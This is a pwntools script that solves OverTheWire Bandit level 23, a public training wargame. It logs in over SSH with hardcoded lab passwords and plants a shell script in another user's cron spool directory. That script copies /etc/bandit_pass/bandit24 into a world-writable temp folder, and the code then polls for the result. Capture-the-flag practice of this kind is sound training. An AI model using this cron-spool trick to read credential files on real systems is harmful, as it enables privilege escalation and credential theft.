from pwn import *


user = "bandit23"
password = "jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n"
host = "bandit.labs.overthewire.org"
port = 2220

def bandit23(user, host, password, port):
    shell = ssh(user, host, password=password, port=port)
    sh = shell.run('sh')
    #sh.sendline("cd /var/spool/bandit24")
    sh.sendline("myname=bandit24")
    sh.sendline("mkdir -p /tmp/DnTGXWGhfshLwWsm")
    sh.sendline("chmod 777 /tmp/DnTGXWGhfshLwWsm")
    #sh.sendline("ls -la /tmp/DnTGXWGhfshLwWsm")
    sh.sendline('''echo "#!/bin/bash\ncat /etc/bandit_pass/bandit24 > /tmp/DnTGXWGhfshLwWsm/password.txt" > /var/spool/bandit24/password.sh''')
    sh.sendline("chmod +x /var/spool/bandit24/password.sh")
    #sh.sendline("cat /var/spool/bandit24/password.sh")
    log.progress("Waiting for cronjob to execute its work")
    sh.sendline("cat /tmp/DnTGXWGhfshLwWsm/password.txt")
    final = sh.recvline().decode("utf-8")
    result = final.replace("$", "").replace(">", "").replace("   ", " ").replace(" ", "")
    flag = result

    while "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ" not in flag:
        sh.sendline("cat /tmp/DnTGXWGhfshLwWsm/password.txt")
        ending = sh.recvline().decode("utf-8")
        show = ending.replace("$", "").replace(">", "").replace("   ", " ").replace(" ", "")
        #print(show)
        if show == "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ":
            break
        else:
            flag = show

    sh.sendline("rm -r /tmp/DnTGXWGhfshLwWsm")
    sh.sendline("y")
    print("The password for Bandit24 is === $ " + flag)
    sh.close()
if __name__ == "__main__":
    bandit23(user, host, password, port)


